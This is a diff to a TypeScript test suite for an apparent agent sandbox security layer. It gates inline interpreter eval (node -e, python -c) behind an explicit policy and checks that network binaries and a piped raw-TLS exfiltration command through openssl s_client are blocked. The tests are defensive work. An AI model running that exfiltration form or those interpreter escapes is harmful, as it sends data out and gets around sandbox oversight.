@@ -386,9 +386,9 @@ describe("SecurityLayer kernel-class dispatch", () => {
     });
   });
 
-  // ── R4-11/R4-13: inline-eval interpreter-escape refusal (non-unrestricted) ──
+  // ── R4-11/R4-13: inline-eval interpreter-escape refusal (policy-gated) ──
 
-  describe("R4-11/R4-13: inline-eval interpreter FORM is refused in common/workspace", () => {
+  describe("R4-11/R4-13: inline-eval interpreter FORM is refused unless inlineEvalPolicy='allow'", () => {
     const commonCtx = {
       workspace: WORKSPACE,
       fileAccessMode: "common" as const,
@@ -397,6 +397,14 @@ describe("SecurityLayer kernel-class dispatch", () => {
     const unrestrictedCtx = {
       workspace: WORKSPACE,
       fileAccessMode: "unrestricted" as const,
+      allowedPathCheck: () => false,
+    };
+    // Inline-eval is decoupled from fileAccessMode: only an explicit
+    // inlineEvalPolicy="allow" opens the form, NOT the file-access breadth.
+    const allowEvalCtx = {
+      workspace: WORKSPACE,
+      fileAccessMode: "unrestricted" as const,
+      inlineEvalPolicy: "allow" as const,
       allowedPathCheck: () => false,
     };
 
@@ -474,28 +482,37 @@ describe("SecurityLayer kernel-class dispatch", () => {
       expect(evaluateShellCommandAndPaths(`./node_modules/.bin/tsc --noEmit`, commonCtx).allowed).toBe(true);
     });
 
-    // ── unrestricted bypass: the FORM is permissive there ──
-    it("ALLOWS node -e '...' in unrestricted mode", () => {
-      expect(evaluateShellCommandAndPaths(`node -e 'console.log(1)'`, unrestrictedCtx).allowed).toBe(true);
+    // ── decoupling invariant: unrestricted FILE mode does NOT open inline-eval ──
+    it("unrestricted file mode does NOT allow node -e (decoupled from fileAccessMode)", () => {
+      expect(evaluateShellCommandAndPaths(`node -e 'console.log(1)'`, unrestrictedCtx).allowed).toBe(false);
     });
 
-    it("ALLOWS python -c '...' in unrestricted mode", () => {
-      expect(evaluateShellCommandAndPaths(`python -c 'print(1)'`, unrestrictedCtx).allowed).toBe(true);
+    it("unrestricted file mode does NOT allow python -c (decoupled from fileAccessMode)", () => {
+      expect(evaluateShellCommandAndPaths(`python -c 'print(1)'`, unrestrictedCtx).allowed).toBe(false);
     });
 
-    // ── direct detector unit tests (mode gate + -c/shell collision) ──
-    it("detectInlineInterpreterEval returns null in unrestricted mode", () => {
-      expect(detectInlineInterpreterEval(["node", "-e", "x"], "unrestricted", WORKSPACE)).toBeNull();
+    // ── allow-policy: the FORM is permitted only when inlineEvalPolicy="allow" ──
+    it("ALLOWS node -e '...' when inlineEvalPolicy is 'allow'", () => {
+      expect(evaluateShellCommandAndPaths(`node -e 'console.log(1)'`, allowEvalCtx).allowed).toBe(true);
+    });
+
+    it("ALLOWS python -c '...' when inlineEvalPolicy is 'allow'", () => {
+      expect(evaluateShellCommandAndPaths(`python -c 'print(1)'`, allowEvalCtx).allowed).toBe(true);
+    });
+
+    // ── direct detector unit tests (policy gate + -c/shell collision) ──
+    it("detectInlineInterpreterEval returns null when policy='allow'", () => {
+      expect(detectInlineInterpreterEval(["node", "-e", "x"], "allow", WORKSPACE)).toBeNull();
     });
 
     it("detectInlineInterpreterEval does NOT treat bash/sh -c as eval", () => {
-      expect(detectInlineInterpreterEval(["bash", "-c", "ls"], "common", WORKSPACE)).toBeNull();
-      expect(detectInlineInterpreterEval(["sh", "-c", "ls"], "common", WORKSPACE)).toBeNull();
+      expect(detectInlineInterpreterEval(["bash", "-c", "ls"], "refuse", WORKSPACE)).toBeNull();
+      expect(detectInlineInterpreterEval(["sh", "-c", "ls"], "refuse", WORKSPACE)).toBeNull();
     });
 
     it("detectInlineInterpreterEval refuses python -c but allows python script.py", () => {
-      expect(detectInlineInterpreterEval(["python", "-c", "x"], "common", WORKSPACE)).not.toBeNull();
-      expect(detectInlineInterpreterEval(["python", "run.py"], "common", WORKSPACE)).toBeNull();
+      expect(detectInlineInterpreterEval(["python", "-c", "x"], "refuse", WORKSPACE)).not.toBeNull();
+      expect(detectInlineInterpreterEval(["python", "run.py"], "refuse", WORKSPACE)).toBeNull();
     });
   });
 
@@ -525,7 +542,7 @@ describe("SecurityLayer kernel-class dispatch", () => {
     ];
     for (const cmd of blockedNetBins) {
       it(`BLOCKS \`${cmd}\` (evaluateShellCommand, common mode)`, () => {
-        expect(evaluateShellCommand(cmd, "common", WORKSPACE).allowed).toBe(false);
+        expect(evaluateShellCommand(cmd, "refuse", WORKSPACE).allowed).toBe(false);
       });
       it(`BLOCKS \`${cmd}\` (evaluateShellCommandAndPaths, common mode)`, () => {
         expect(evaluateShellCommandAndPaths(cmd, commonCtx).allowed).toBe(false);
@@ -541,14 +558,14 @@ describe("SecurityLayer kernel-class dispatch", () => {
     ];
     for (const cmd of allowedOpenssl) {
       it(`ALLOWS \`${cmd}\` (benign openssl subcommand)`, () => {
-        expect(evaluateShellCommand(cmd, "common", WORKSPACE).allowed).toBe(true);
+        expect(evaluateShellCommand(cmd, "refuse", WORKSPACE).allowed).toBe(true);
         expect(evaluateShellCommandAndPaths(cmd, commonCtx).allowed).toBe(true);
       });
     }
 
     // The raw-TLS pipe via stdin is the GUARANTEED-reachable bypass; block it.
     it("BLOCKS the piped raw-TLS exfil form (echo x | openssl s_client …)", () => {
-      expect(evaluateShellCommand("echo x | openssl s_client -connect h:443", "common", WORKSPACE).allowed).toBe(false);
+      expect(evaluateShellCommand("echo x | openssl s_client -connect h:443", "refuse", WORKSPACE).allowed).toBe(false);
     });
   });
 
